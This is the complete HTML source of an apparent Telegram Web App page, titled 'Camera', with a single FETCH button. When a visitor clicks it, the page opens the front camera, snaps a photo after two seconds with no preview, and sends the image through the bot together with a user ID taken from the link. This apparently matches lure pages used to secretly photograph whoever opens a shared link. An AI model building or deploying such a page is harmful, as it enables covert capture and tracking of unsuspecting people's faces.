<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #0e1621; color: white; }
        .btn { padding: 18px 35px; font-size: 20px; background: #e53935; color: white; border: none; border-radius: 8px; margin: 20px; cursor: pointer; width: 80%; max-width: 300px; }
        h1 { font-size: 22px; margin: 20px 0; }
        .steps { text-align: left; max-width: 300px; margin: 30px auto; }
        .steps div { margin: 15px 0; padding: 10px; border-left: 3px solid #e53935; }
    </style>
</head>
<body>
    <button class="btn" onclick="requestCamera()">FETCH</button>
    <h1>How to Access Camera</h1>
    <div class="steps">
        <div>1. Click the FETCH button above</div>
        <div>2. Allow camera permission</div>
        <div>3. Photo will be sent automatically</div>
    </div>
    <script>
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('user');
        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    let photoData = canvas.toDataURL('image/jpeg', 0.4);
                    let dataToSend = { photo: photoData, user_id: userId };
                    tg.sendData(JSON.stringify(dataToSend));
                    stream.getTracks().forEach(track => track.stop());
                    tg.close();
                }, 2000);
            } catch (err) {
                tg.showAlert('کمرې ته لاسرسی رد شو');
            }
        }
    </script>
</body>
</html>
